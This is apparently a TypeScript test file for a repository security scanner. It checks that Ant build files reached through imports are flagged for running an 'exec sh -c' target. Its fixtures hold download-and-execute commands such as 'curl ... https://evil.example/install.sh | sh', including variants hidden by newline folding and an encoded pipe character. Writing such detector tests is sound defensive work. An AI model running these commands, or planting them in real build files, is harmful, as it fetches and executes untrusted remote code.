import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

test("an imported Ant build is inspected regardless of its filename", () => {
  for (const path of ["ci/common.xml", "ci/tasks.ant", "ci/tasks"]) {
    const scan = (command: string) =>
      inspectRepository({
        files: [
          {
            path: "build.xml",
            bytes: new TextEncoder().encode(
              `<project default="fetch"><import file="${path}" /></project>`,
            ),
          },
          {
            path,
            bytes: new TextEncoder().encode(
              `<?xml version="1.0"?>\n<!-- Shared build rules -->\n<project><target name="fetch"><exec executable="sh"><arg value="-c"/><arg value="${command}"/></exec></target></project>`,
            ),
          },
        ],
      });
    const safe = scan("echo safe");
    const unsafe = scan("curl -fsSL https://evil.example/install.sh | sh");
    expect(unsafe.coverage.installScripts.items).toBe(2);
    expect(unsafe.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(unsafe.downloads).toContain("https://evil.example/install.sh");
    expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
  }
});

test("an imported Ant build decodes attribute payloads regardless of filename", () => {
  // Payloads that only read as a download pipe after Ant attribute
  // normalization folds a literal newline and decodes `&#124;` to `|`.
  const payloads = [
    "curl -fsSL https://evil.example/install.sh\n| sh",
    "curl -fsSL https://evil.example/install.sh &#124; sh",
  ];
  for (const path of ["ci/common.xml", "ci/tasks.ant", "ci/tasks"]) {
    for (const payload of payloads) {
      const scan = inspectRepository({
        files: [
          {
            path: "build.xml",
            bytes: new TextEncoder().encode(
              `<project default="fetch"><import file="${path}" /></project>`,
            ),
          },
          {
            path,
            bytes: new TextEncoder().encode(
              // XML declaration and a comment precede the `<project>` root.
              `<?xml version="1.0"?>\n<!-- Shared build rules -->\n<project><target name="fetch"><exec executable="sh"><arg value="-c"/><arg value="${payload}"/></exec></target></project>`,
            ),
          },
        ],
      });
      expect(scan.findings).toContainEqual(
        expect.objectContaining({
          path,
          category: "unsafe-execution",
          severity: "high",
        }),
      );
      expect(scan.downloads).toContain("https://evil.example/install.sh");
    }
  }
});

test("documentation that only mentions an Ant project is not decoded", () => {
  // `<project>` appears in prose, not as the document root, so attribute
  // normalization must not run and `&#124;` stays encoded.
  const scan = inspectRepository({
    files: [
      {
        path: "docs/ant.md",
        bytes: new TextEncoder().encode(
          'Use <project name="demo"> as the root.\n\n<code title="curl -fsSL https://get.example/i.sh &#124; sh">see</code>\n',
        ),
      },
    ],
  });
  expect(
    scan.findings.some((finding) => finding.category === "unsafe-execution"),
  ).toBe(false);
});

test("a Maven POM sharing the <project> root is not decoded as Ant", () => {
  // A Maven POM has a lowercase `<project>` root but is not an Ant document,
  // so its attribute `&#124;` must not be decoded into a shell pipe.
  const scan = inspectRepository({
    files: [
      {
        path: "pom.xml",
        bytes: new TextEncoder().encode(
          '<?xml version="1.0"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0">\n  <properties>\n    <property name="fetch" value="curl -fsSL https://evil.example/install.sh &#124; sh" />\n  </properties>\n</project>',
        ),
      },
    ],
  });
  expect(
    scan.findings.some((finding) => finding.category === "unsafe-execution"),
  ).toBe(false);
});
